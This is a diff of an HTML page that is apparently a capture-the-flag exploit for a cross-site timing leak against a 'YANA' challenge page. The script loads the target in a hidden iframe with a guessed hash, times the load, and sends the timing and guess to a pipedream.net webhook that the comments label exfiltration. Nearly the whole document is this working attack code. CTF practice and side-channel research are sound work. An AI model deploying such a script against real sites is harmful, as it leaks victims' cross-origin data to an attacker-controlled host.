@@ -1,36 +1,43 @@
 <html>
     <head>
         <script>
-
             function runTest(param) {
                 // Wait for the iframe to load (~500ms)
                 setTimeout(() => {
 
-                    // image to load for correct guess
-                    img_url = 'https://dotorikko.github.io/static/LoX-Zombie/n.png';
+                    // URL to load for the flag
+                    var url_to_load = 'https://dotorikko.github.io/static/LoX-Zombie/YANA.html#flag';
 
-                    // image to report (exfiltration)
-                    wh_url = 'https://eov64fuwy36zo3n.m.pipedream.net';
+                    // Webhook URL to report (exfiltration)
+                    var wh_url = 'https://eov64fuwy36zo3n.m.pipedream.net';
 
                     var start = window.performance.now();
 
-                    // Load the 'Y' image
-                    fetch(img_url, {'mode': 'cors', 'cache': 'force-cache'}).then(response => {
+                    // Create an iframe element
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none'; // Hide the iframe
+                    iframe.src = url_to_load; // Set the src to the YANA.html#flag URL
+                    document.body.appendChild(iframe);
+
+                    // Listen for the iframe load event
+                    iframe.onload = function() {
                         var end = window.performance.now();
                         var timing = end - start;
 
-                        // Exfiltrate load time for the image
-                        fetch(wh_url + '/yanastats?status=' + response.status + '&time=' + timing + '&key=' + encodeURIComponent(param));
-                    });
-                    }, 500);
+                        // Exfiltrate the load time for the iframe page
+                        fetch(wh_url + '/yanastats?status=200&time=' + timing + '&key=' + encodeURIComponent(param));
+
+                        // Optionally, you can remove the iframe after it's loaded
+                        iframe.remove();
+                    };
+                }, 500);
             }
         </script>
     </head>
     <body>
         <!-- Changed hash - non-flag string -->
-        <!--//<iframe id="ifr" src="https://dotorikko.github.io/static/LoX-Zombie/YANA.html#"></iframe><br/>-->
         <script>
-            runTest("x99xx");
+            runTest("flag");
         </script>
     </body>
 </html>
